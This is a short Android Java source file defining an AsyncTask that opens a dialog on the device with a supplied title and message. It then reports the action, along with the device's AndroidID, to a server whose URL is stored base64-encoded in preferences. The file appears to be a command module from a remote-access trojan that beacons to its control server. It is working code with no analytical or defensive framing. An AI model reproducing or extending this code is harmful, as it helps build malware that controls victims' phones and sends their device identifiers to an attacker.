package com.asynctask;

import android.content.Intent;
import android.os.AsyncTask;
import android.preference.PreferenceManager;
import android.util.Base64;

import com.connect.Dialog;
import com.connect.MyApplication;
import com.utils.CommonUtils;

import java.io.UnsupportedEncodingException;

/**
 * Created by Conan0xff on 2017/12/3.
 */

public class openDialog extends AsyncTask<String, Void, String> {
    String i = ""; //title
    String j = ""; //message

    public openDialog(String i, String j) {
        this.i = i;
        this.j = j;
    }

    @Override
    protected String doInBackground(String... params) {
        Intent intent = new Intent(MyApplication.getContext(), Dialog.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.putExtra("Title", i);
        intent.putExtra("Message", j);
        MyApplication.getContext().startActivity(intent);
        try {
            String URL = new String(Base64.decode(PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("URL", ""), Base64.DEFAULT));
            CommonUtils.getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("AndroidID", "") + "&Data=", "Opened Dialog: " + i + " : " + j);
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        return "Executed";
    }

    @Override
    protected void onPostExecute(String result) {/*httpcalldone*/}

    @Override
    protected void onPreExecute() {/*httpcallexecuting*/}

    @Override
    protected void onProgressUpdate(Void... values) {
    }
}
